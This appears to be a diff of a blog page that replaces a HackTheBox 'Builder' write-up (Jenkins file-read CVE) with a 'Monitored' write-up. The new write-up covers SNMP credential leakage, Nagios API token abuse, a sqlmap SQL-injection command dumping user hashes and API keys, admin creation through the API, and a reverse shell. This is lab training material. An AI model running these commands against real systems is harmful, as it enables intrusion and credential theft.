@@ -5,7 +5,7 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>HackTheBox Writeup - Builder Room – g4nd1v</title>
+    <title>HackTheBox Writeup - Monitored Box – g4nd1v</title>
     
 
 
@@ -653,7 +653,7 @@
     
     var baseurl = JSON.parse("\"https://g4nd1v.github.io\"");
     
-    var permalink = JSON.parse("\"https://g4nd1v.github.io/posts/hackthebox-builder/\"");
+    var permalink = JSON.parse("\"https://g4nd1v.github.io/posts/hackthebox-monitored/\"");
     
     var langprefix = JSON.parse("\"\"");
     var searchResults = null;
@@ -1344,25 +1344,25 @@
 <meta name="description" content="" />
 
 
-<meta name="keywords" content="HackTheBox ,CVE ,Jenkins">
+<meta name="keywords" content="HackTheBox ,SNMP ,nagios">
 
-<meta name="created" content=" 2024-05-19T00:00:00&#43;0000">
-<meta name="modified" content=" 2024-05-19T00:00:00&#43;0000">
-<meta property="article:published_time" content=" 2024-05-19T00:00:00&#43;0000">
+<meta name="created" content=" 2024-05-21T00:00:00&#43;0000">
+<meta name="modified" content=" 2024-05-21T00:00:00&#43;0000">
+<meta property="article:published_time" content=" 2024-05-21T00:00:00&#43;0000">
 
 <meta name="author" content="">
-<meta property="article:author" content="https://g4nd1v.github.io/posts/hackthebox-builder/@">
+<meta property="article:author" content="https://g4nd1v.github.io/posts/hackthebox-monitored/@">
 
 
 <meta property="og:site_name" content="g4nd1v">
-<meta property="og:title" content="HackTheBox Writeup - Builder Room">
-<meta property="og:url" content="https://g4nd1v.github.io/posts/hackthebox-builder/">
+<meta property="og:title" content="HackTheBox Writeup - Monitored Box">
+<meta property="og:url" content="https://g4nd1v.github.io/posts/hackthebox-monitored/">
 <meta property="og:type" content="article">
 <meta property="og:description" content="">
 
 
-<meta property="og:image" content="https://g4nd1v.github.io/images/Builder/banner.jpeg">
-<meta property="og:image:url" content="https://g4nd1v.github.io/images/Builder/banner.jpeg">
+<meta property="og:image" content="https://g4nd1v.github.io/images/Monitored/banner.jpeg">
+<meta property="og:image:url" content="https://g4nd1v.github.io/images/Monitored/banner.jpeg">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:app:name:iphone" content="g4nd1v">
 <meta property="twitter:title" content="">
@@ -1378,7 +1378,7 @@
 
 <meta name="apple-mobile-web-app-status-bar-style" content="#fff">
 
-<link rel="canonical" href="https://g4nd1v.github.io/posts/hackthebox-builder/">
+<link rel="canonical" href="https://g4nd1v.github.io/posts/hackthebox-monitored/">
 
 <link rel="manifest" href="/%20manifest.json">
 
@@ -1391,13 +1391,13 @@
   {
     "@context": "https://schema.org",
     "@type": "WebPage",
-    "headline": "HackTheBox Writeup - Builder Room",
-    "datePublished": "2024-05-19T00:00:00Z",
-    "dateModified": "2024-05-19T00:00:00Z",
-    "url" : "https://g4nd1v.github.io/posts/hackthebox-builder/",
-    "description": "Detailed walkthrough of the Builder box on HackTheBox platform, covering initial enumeration with LFI, exploiting vulnerabilities, and obtaining user and root flags.",
-    "keywords": ["HackTheBox","CVE","Jenkins"],
-    "image" : "https://g4nd1v.github.io/images/Builder/banner.jpeg",
+    "headline": "HackTheBox Writeup - Monitored Box",
+    "datePublished": "2024-05-21T00:00:00Z",
+    "dateModified": "2024-05-21T00:00:00Z",
+    "url" : "https://g4nd1v.github.io/posts/hackthebox-monitored/",
+    "description": "Detailed walkthrough of the Monitored box on HackTheBox platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.",
+    "keywords": ["HackTheBox","SNMP","nagios"],
+    "image" : "https://g4nd1v.github.io/images/Monitored/banner.jpeg",
     "author": {
       "@type": "Person",
       "name": "g4nd1v"
@@ -1648,7 +1648,7 @@
   
   <li  class="is-active" >
     
-      <span>HackTheBox Writeup - Builder Room</span>
+      <span>HackTheBox Writeup - Monitored Box</span>
     
   </li>
   
@@ -1660,14 +1660,14 @@
   <div class="single ">
     <div class="single__nojs">This page looks best with JavaScript enabled</div>
     <script>document.querySelector('.single').classList.remove('hide'); document.querySelector('.single__nojs').classList.add('hide');</script>
-    <h2 class="single__title" data-ani="true">HackTheBox Writeup - Builder Room</h2>
+    <h2 class="single__title" data-ani="true">HackTheBox Writeup - Monitored Box</h2>
     <h3 class="single__subtitle"></h3>
     <div class="single__meta">
       
 <div class="single__infos">
-  <time class="single__info" title="Written At">📅&nbsp;May 19, 2024 </time>
+  <time class="single__info" title="Written At">📅&nbsp;May 21, 2024 </time>
   
-  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;5&nbsp;min read </span>
+  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;6&nbsp;min read </span>
   
   &nbsp;&middot;&nbsp; <span class="single__info" title="WRITTEN BY">👨‍💻&nbsp;g4nd1v</span>
   
@@ -1684,9 +1684,9 @@
 
   <li><a href="https://g4nd1v.github.io/tags/hackthebox/" class="single__tag" title="HackTheBox">#HackTheBox</a></li>
 
-  <li><a href="https://g4nd1v.github.io/tags/cve/" class="single__tag" title="CVE">#CVE</a></li>
+  <li><a href="https://g4nd1v.github.io/tags/snmp/" class="single__tag" title="SNMP">#SNMP</a></li>
 
-  <li><a href="https://g4nd1v.github.io/tags/jenkins/" class="single__tag" title="Jenkins">#Jenkins</a></li>
+  <li><a href="https://g4nd1v.github.io/tags/nagios/" class="single__tag" title="nagios">#nagios</a></li>
 
 </ul>
 
@@ -1715,13 +1715,13 @@
 <thead>
 <tr>
 <th>Title</th>
-<th><a href="https://app.hackthebox.com/machines/Builder">Builder</a></th>
+<th><a href="https://app.hackthebox.com/machines/Monitored">Monitored</a></th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>Description</td>
-<td>Builder is HackTheBox Medium Linux Based Machine.</td>
+<td>Monitored is HackTheBox Medium Linux Based Machine.</td>
 </tr>
 <tr>
 <td>Difficulty</td>
@@ -1729,11 +1729,12 @@
 </tr>
 <tr>
 <td>Maker</td>
-<td><a href="https://app.hackthebox.com/users/159204">polarbearer</a> and <a href="https://app.hackthebox.com/users/123322">amra13579</a></td>
+<td><a href="https://app.hackthebox.com/users/114053">TheCyberGeek</a> and <a href="https://app.hackthebox.com/users/1253217">ruycr4ft</a></td>
 </tr>
 </tbody>
 </table>
 <h2 id="nmap">Nmap</h2>
+<p>TCP Scan</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1756,146 +1757,150 @@
 </span><span class="lnt">18
 </span><span class="lnt">19
 </span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">└─$ nmap -sC -sV -oA nmap/builder 10.10.11.10
-</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-18 22:59 EDT
-</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.10
-</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.055s latency<span class="o">)</span>.
-</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
-</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
-</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">└─$ nmap -sC -sV -oA nmap/monitered 10.129.239.185                                                                                                                                                                                                          <span class="o">[</span>1/76<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Nmap 7.94SVN scan initiated Sun Jan 14 19:57:43 2024 as: nmap -sC -sV -oA nmap/monitered 10.129.239.185</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.239.185
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.087s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">996</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span class="o">(</span>ECDSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 64:cc:75🇩🇪4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span class="o">(</span>ED25519<span class="o">)</span>
-</span></span><span class="line"><span class="cl">8080/tcp open  http    Jetty 10.0.18
-</span></span><span class="line"><span class="cl"><span class="p">|</span> http-open-proxy: Potentially OPEN proxy.
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_Methods supported:CONNECTION
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Jetty<span class="o">(</span>10.0.18<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> http-robots.txt: <span class="m">1</span> disallowed entry
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_/
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Dashboard <span class="o">[</span>Jenkins<span class="o">]</span>
-</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp  open  http     Apache httpd 2.4.56
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to https://nagios.monitored.htb/
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.56 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl">389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
+</span></span><span class="line"><span class="cl">443/tcp open  ssl/http Apache httpd 2.4.56 <span class="o">((</span>Debian<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.56 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Nagios XI
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>nagios.monitored.htb/organizationName<span class="o">=</span>Monitored/stateOrProvinceName<span class="o">=</span>Dorset/countryName<span class="o">=</span>UK
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2023-11-11T21:46:55
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2297-08-25T21:46:55
+</span></span><span class="line"><span class="cl">Service Info: Host: nagios.monitored.htb<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>So basically there are 2 ports that are open, that is, <code>22</code> and <code>8080</code></p>
+</div><p>UDP Scan</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">└─$ sudo nmap -sU --min-rate <span class="m">10000</span> 10.10.11.248
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> kali:
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-21 00:09 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> monitored.htb <span class="o">(</span>10.10.11.248<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.012s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">992</span> open<span class="p">|</span>filtered udp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE  SERVICE
+</span></span><span class="line"><span class="cl">21/udp    closed ftp
+</span></span><span class="line"><span class="cl">123/udp   open   ntp
+</span></span><span class="line"><span class="cl">161/udp   open   snmp
+</span></span><span class="line"><span class="cl">631/udp   closed ipp
+</span></span><span class="line"><span class="cl">19039/udp closed unknown
+</span></span><span class="line"><span class="cl">19933/udp closed unknown
+</span></span><span class="line"><span class="cl">21354/udp closed unknown
+</span></span><span class="line"><span class="cl">55544/udp closed unknown
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Firstly, I have added <code>IP</code> in <code>/etc/hosts</code> associated with <code>monitored.htb</code> and <code>nagios.monitored.htb</code> — On visiting website at <code>nagios.monitored.htb</code> it seems we have a login page, I have tried basic SQL injection attacks in this portal, but it is of no use.</p>
+<p><img src="/images/Monitored/Untitled.png" alt="Untitled" /></p>
+<p>I have searched for <code>nagios</code> on google, and found there are multiple vulnerabilities on this software, I sorted the exploits by latest date and then found that, it will require username and password. I tried to find that from other ports in TCP but no luck.</p>
+<p>I tried to move my testing to UDP ports, in UDP there are 2 ports that are open. One of them is <code>snmp</code>. So using <code>snmpwalk</code> I have begin my pentesting. I have tried with smnpwalk and found that there are number of strings to look, therefore I have used grep in order to find username, password or something interesting file.</p>
+<p><img src="/images/Monitored/Untitled%201.png" alt="Untitled" /></p>
+<p>It seems that it is using this command → <code>sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB</code> — from this we can conclude that <code>svc</code> is the user and <code>XjH7VCehowpR1xZB</code> might be it’s password. Next, I tried to login in the website. But it gave me this error → <code>The specified user account has been disabled or does not exist.</code> That means the username and password is correct, but the account is disabled.</p>
+<p>After researching about <code>nagios</code> I found that it is using API to authenticate and from the exploits before, it was also using APIs. Therefore, I googled API about it by searching error and learning how to authenticate in nagios. I found this link which is very helpful - <a href="https://support.nagios.com/forum/viewtopic.php?t=58783">https://support.nagios.com/forum/viewtopic.php?t=58783</a></p>
+<p>It says, use this to authenticate → <code>curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=nagiosadmin&amp;password=YOURPASS&amp;valid_min=5'</code></p>
+<p><img src="/images/Monitored/Untitled%202.png" alt="Untitled" /></p>
+<p>Voila, we got the token, simply using <code>?token=&lt;TOKEN&gt;</code> in web will bypass the account restrictions. Like this — <a href="https://nagios.monitored.htb/nagiosxi/?token=fd8dd9d35d2feaf0b9f6444dd67a197d3d639de1">https://nagios.monitored.htb/nagiosxi/?token=fd8dd9d35d2feaf0b9f6444dd67a197d3d639de1</a></p>
 <h2 id="user-flag">User Flag</h2>
-<p>On port 8080 we have Jenkins service running and it’s version is <code>2.441</code></p>
-<p><img src="/images/Builder/Untitled.png" alt="Untitled" /></p>
-<p>From quick googling, I found that it has CVE-2024-23897 - <a href="https://www.exploit-db.com/exploits/51993">https://www.exploit-db.com/exploits/51993</a> → we can able to read file on server.</p>
-<p>Download this file and test it with <code>/etc/passwd</code></p>
-<p><img src="/images/Builder/Untitled%201.png" alt="Untitled" /></p>
-<p>Interested in learning more about this vulnerability? Here → <a href="https://www.jenkins.io/security/advisory/2024-01-24/">https://www.jenkins.io/security/advisory/2024-01-24/</a></p>
-<p>Now, in order to check environment variables, we can use <code>/proc/self/environ</code> file.</p>
+<p>Now, as we are inside the website, we got user cookie, we can use CVEs which we found earlier.</p>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-40931">https://nvd.nist.gov/vuln/detail/CVE-2023-40931</a></p>
+<p><a href="https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567">https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567</a></p>
+<p>CVE is all about SQL Injection, we can directly exploit it using sqlmap.</p>
+<p><code>sqlmap -u &quot;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php&quot; --data=&quot;id=3&amp;action=acknowledge_banner_message&quot; --cookie &quot;nagiosxi=eoas0cdgnqdpcmdn243jm2gson&quot; --dbms=MySQL --level=1 --risk=1 -D nagiosxi -T xi_users --dump</code></p>
+<p>We found password hashes from database.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; /proc/self/environ
-</span></span><span class="line"><span class="cl"><span class="nv">HOSTNAME</span><span class="o">=</span><span class="nv">0f52c222a4ccJENKINS_UC_EXPERIMENTAL</span><span class="o">=</span>https://updates.jenkins.io/experimentalJAVA_HOME<span class="o">=</span>/opt/java/openjdkJENKINS_INCREMENTALS_REPO_MIRROR<span class="o">=</span>https://repo.jenkins-ci.org/incrementalsCOPY_REFERENCE_FILE_LOG<span class="o">=</span>/var/jenkins_home/copy_refer
-</span></span><span class="line"><span class="cl">ence_file.logPWD<span class="o">=</span>/JENKINS_SLAVE_AGENT_PORT<span class="o">=</span><span class="nv">50000JENKINS_VERSION</span><span class="o">=</span>2.441HOME<span class="o">=</span>/var/jenkins_homeLANG<span class="o">=</span>C.UTF-8JENKINS_UC<span class="o">=</span>https://updates.jenkins.ioSHLVL<span class="o">=</span><span class="nv">0JENKINS_HOME</span><span class="o">=</span>/var/jenkins_homeREF<span class="o">=</span>/usr/share/jenkins/refPATH<span class="o">=</span>/opt/java/openjdk/bin:/usr/l
-</span></span><span class="line"><span class="cl">ocal/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Database: nagiosxi
+</span></span><span class="line"><span class="cl">Table: xi_users
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="m">2</span> entries<span class="o">]</span>
+</span></span><span class="line"><span class="cl">+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> user_id <span class="p">|</span> email               <span class="p">|</span> name                 <span class="p">|</span> api_key                                                          <span class="p">|</span> enabled <span class="p">|</span> password                                                     <span class="p">|</span> username    <span class="p">|</span> created_by <span class="p">|</span> last_login <span class="p">|</span> api_enabled <span class="p">|</span> last_edited <span class="p">|</span> created_time <span class="p">|</span> last_attempt <span class="p">|</span> backend_ticket                                                   <span class="p">|</span> last_edited_by <span class="p">|</span> login_attempts <span class="p">|</span> last_password_change <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">1</span>       <span class="p">|</span> admin@monitored.htb <span class="p">|</span> Nagios Administrator <span class="p">|</span> IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL <span class="p">|</span> <span class="m">1</span>       <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$825</span>c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C <span class="p">|</span> nagiosadmin <span class="p">|</span> <span class="m">0</span>          <span class="p">|</span> <span class="m">1701931372</span> <span class="p">|</span> <span class="m">1</span>           <span class="p">|</span> <span class="m">1701427555</span>  <span class="p">|</span> <span class="m">0</span>            <span class="p">|</span> <span class="m">0</span>            <span class="p">|</span> IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0                                 <span class="p">|</span> <span class="m">5</span>              <span class="p">|</span> <span class="m">0</span>              <span class="p">|</span> <span class="m">1701427555</span>           <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">2</span>       <span class="p">|</span> svc@monitored.htb   <span class="p">|</span> svc                  <span class="p">|</span> 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK <span class="p">|</span> <span class="m">0</span>       <span class="p">|</span> <span class="nv">$2</span>a<span class="nv">$10$12</span>edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK <span class="p">|</span> svc         <span class="p">|</span> <span class="m">1</span>          <span class="p">|</span> <span class="m">1699724476</span> <span class="p">|</span> <span class="m">1</span>           <span class="p">|</span> <span class="m">1699728200</span>  <span class="p">|</span> <span class="m">1699634403</span>   <span class="p">|</span> <span class="m">1716269191</span>   <span class="p">|</span> 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq <span class="p">|</span> <span class="m">1</span>              <span class="p">|</span> <span class="m">9</span>              <span class="p">|</span> <span class="m">1699697433</span>           <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Now that we know the home directory, we can get the user flag.</p>
+</div><p>I have added this hashes in file, but I cannot be able to crack this hashes. Next thing I searched is is there any way I can login to user with api_key as it is provided in database.</p>
+<p>On google different ways to login in nagios, I found this exploit, in which using <code>createAdmin</code> function, we got the hint of how to create admin user from just api key. We have to send the admin api key to this post request <code>/nagiosxi/api/v1/system/user?apikey=&lt;api_key&gt;</code> with this body <code>username=g4nd1v&amp;password=whoami&amp;name=g4nd1v&amp;email=whoami@test.com&amp;auth_level=admin</code></p>
+<p><img src="/images/Monitored/Untitled%203.png" alt="Untitled" /></p>
+<p>Now, we can login with our username and password, that is <code>g4nd1v:whoami</code> and boom we are logged in as admin. From the dashboard tab, go to configure → core config manager → commands → new command — add our rev shell over here, then save and apply configuration.</p>
+<p><img src="/images/Monitored/Untitled%204.png" alt="Untitled" /></p>
+<p>Again go to configure → core config manager → services → add new → select rev shell and then run command. Then boom, we got the shell.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; /var/jenkins_home/user.txt
-</span></span><span class="line"><span class="cl">725ca98881930e7627e470c7e9855880
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nagios@monitored:~$ ls
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">cookie.txt
+</span></span><span class="line"><span class="cl">user.txt
+</span></span><span class="line"><span class="cl">nagios@monitored:~$ cat user.txt
+</span></span><span class="line"><span class="cl">cat user.txt
+</span></span><span class="line"><span class="cl">f37c90b5afd59a48ebf10fca1db7c7b6
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="root-flag">Root Flag</h2>
-<p>Now, in order to enumerate more in the machine, we need to know what is the file structure of Junkins, that is why I have pulled Jenkins images from docker and navigate path in my local machine in order to gain understanding of different files and folders.</p>
-<p>Firstly, we have to run docker in one tab using <code>sudo docker run -p 8080:8080 --restart=on-failure jenkins/jenkins:lts-jdk17</code> and then on other tab, we can start the container - <code>sudo docker exec -it &lt;id&gt; /bin/sh</code> - we will get <code>&lt;id&gt;</code> from <code>docker ps</code></p>
-<p>File Structure from local file just for understanding. So basically here there is users folder and in that folder, there is <code>users.xml</code> file in which it contains the user information of Jenkins. When we read file, we found it has <code>admin</code> and the another name <code>admin_14267207368007926863</code> which is indeed another directory and then after going in that directory we found <code>config.xml</code> in which there is the password for <code>admin</code> user.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">cd</span> /var/jenkins_home
-</span></span><span class="line"><span class="cl">$ ls
-</span></span><span class="line"><span class="cl">config.xml  copy_reference_file.log  failed-boot-attempts.txt  hudson.model.UpdateCenter.xml  jenkins.telemetry.Correlator.xml  <span class="nb">jobs</span>  nodeMonitors.xml  plugins  secret.key  secret.key.not-so-secret  secrets  userContent  users  war
-</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> users
-</span></span><span class="line"><span class="cl">$ ls
-</span></span><span class="line"><span class="cl">admin_14267207368007926863  users.xml
-</span></span><span class="line"><span class="cl">$ cat users.xml
-</span></span><span class="line"><span class="cl">&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s1">&#39;1.1&#39;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s1">&#39;UTF-8&#39;</span>?&gt;
-</span></span><span class="line"><span class="cl">&lt;hudson.model.UserIdMapper&gt;
-</span></span><span class="line"><span class="cl">  &lt;version&gt;1&lt;/version&gt;
-</span></span><span class="line"><span class="cl">  &lt;idToDirectoryNameMap <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;concurrent-hash-map&#34;</span>&gt;
-</span></span><span class="line"><span class="cl">    &lt;entry&gt;
-</span></span><span class="line"><span class="cl">      &lt;string&gt;admin&lt;/string&gt;
-</span></span><span class="line"><span class="cl">      &lt;string&gt;admin_14267207368007926863&lt;/string&gt;
-</span></span><span class="line"><span class="cl">    &lt;/entry&gt;
-</span></span><span class="line"><span class="cl">  &lt;/idToDirectoryNameMap&gt;
-</span></span><span class="line"><span class="cl">&lt;/hudson.model.UserIdMapper&gt;
-</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> admin_14267207368007926863
-</span></span><span class="line"><span class="cl">$ ls
-</span></span><span class="line"><span class="cl">config.xml
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>So, we will do same thing HTB’s machine.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; /var/jenkins_home/users/users.xml
